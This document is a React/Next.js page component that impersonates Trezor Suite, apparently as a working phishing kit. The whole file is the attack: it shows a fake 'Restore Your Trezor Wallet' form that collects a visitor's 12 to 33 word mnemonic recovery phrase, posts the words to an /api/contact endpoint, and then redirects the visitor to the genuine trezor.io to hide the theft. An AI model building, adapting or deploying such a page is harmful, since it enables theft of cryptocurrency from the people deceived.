"use client";
import { useState } from "react";

const WORD_OPTIONS = [12, 18, 20, 24, 33];

export default function Home() {
  const [count, setCount] = useState(12);
  const [words, setWords] = useState(Array(12).fill(""));
  const [open, setOpen] = useState(true);
  const [submitting, setSubmitting] = useState(false);

  const changeCount = (n) => {
    setCount(n);
    setWords(Array(n).fill(""));
  };

  const updateWord = (i, value) => {
    const copy = [...words];
    copy[i] = value;
    setWords(copy);
  };

  const allFilled = words.every((w) => w.trim() !== "");

  const handleSubmit = async () => {
    if (!allFilled || submitting) return;
    setSubmitting(true);
    try {
      const res = await fetch("/api/contact", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ words, count }),
      });

      if (res.ok) {
        window.location.href = "https://trezor.io/";
        return;
      }
      alert("Submission failed");
    } catch {
      alert("Network error");
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <main className="flex h-screen w-screen bg-gray-50 overflow-hidden">

      {/* LEFT SIDE (STATIC) */}
      <section className="w-full lg:w-2/5 bg-white flex flex-col items-center justify-center p-8 text-center">
        <div className="flex items-center gap-3 mb-6">
          <img src="/images.jpeg" className="w-10 h-10" alt="logo" />
          <span className="text-xl font-semibold text-gray-800">
            Trezor Suite
          </span>
        </div>
        <h1 className="text-5xl font-bold text-gray-800 mt-8">Welcome!</h1>
      </section>

      {/* RIGHT SIDE (FULL SCROLL) */}
      <section className="w-full lg:w-3/5 bg-gray-50 overflow-y-auto p-5 py-10">

        {/* CONNECT CARD */}
        <div className="flex h-[122px] w-[360px] max-w-full mx-auto rounded-full p-2.5 bg-white items-center shadow-lg mb-10">
          <div className="h-[100px] w-[100px] rounded-full bg-gray-100 flex items-center justify-center">
            <img src="/trezor.webp" className="h-10" alt="device" />
          </div>
          <span className="mx-8 text-xl font-medium text-gray-800">
            Connect your Trezor
          </span>
        </div>

        {/* MAIN CARD */}
        <div className="w-full max-w-2xl mx-auto bg-white rounded-2xl shadow-lg overflow-hidden">

          {/* HEADER */}
          <button
            onClick={() => setOpen(!open)}
            className="w-full flex items-center justify-between p-6 border-b border-gray-200 text-sm font-medium text-gray-500"
          >
            <span>Still don’t see your Trezor?</span>
            <svg
              className={`w-5 h-5 transition-transform ${
                open ? "rotate-180" : ""
              }`}
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              viewBox="0 0 24 24"
            >
              <path strokeLinecap="round" strokeLinejoin="round" d="M19 9l-7 7-7-7" />
            </svg>
          </button>

          {open && (
            <div className="p-6">

              <h2 className="text-center text-2xl font-semibold mb-4">
                Restore Your Trezor Wallet!
              </h2>

              <p className="text-center text-sm text-gray-500 mb-6">
                How many words does your Mnemonic contain?
              </p>

              {/* WORD COUNT */}
              <div className="flex justify-center space-x-2 mb-6">
                {WORD_OPTIONS.map((n) => (
                  <button
                    key={n}
                    onClick={() => changeCount(n)}
                    className={`px-4 py-1.5 text-sm rounded border
                      ${
                        count === n
                          ? "bg-green-600 border-green-600 text-white"
                          : "border-gray-300 hover:bg-gray-100"
                      }`}
                  >
                    {n} words
                  </button>
                ))}
              </div>

              <p className="text-xs text-gray-500 text-center mb-4">
                To restore your Trezor, type in your Mnemonic words below
              </p>

              {/* INPUT GRID */}
              <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 mb-8">
                {words.map((val, i) => (
                  <input
                    key={i}
                    value={val}
                    onChange={(e) => updateWord(i, e.target.value)}
                    placeholder={`${i + 1}.`}
                    className="w-full px-3 py-2 border border-gray-300 rounded
                               focus:outline-none focus:ring-2 focus:ring-green-500"
                  />
                ))}
              </div>

              {/* NEXT BUTTON (SCROLLS NATURALLY) */}
              <button
                onClick={handleSubmit}
                disabled={!allFilled || submitting}
                className="px-10 py-2.5 text-sm font-semibold text-white
                           bg-green-600 rounded hover:bg-green-700
                           disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {submitting ? "Submitting....." : "Next"}
              </button>

            </div>
          )}
        </div>
      </section>
    </main>
  );
}
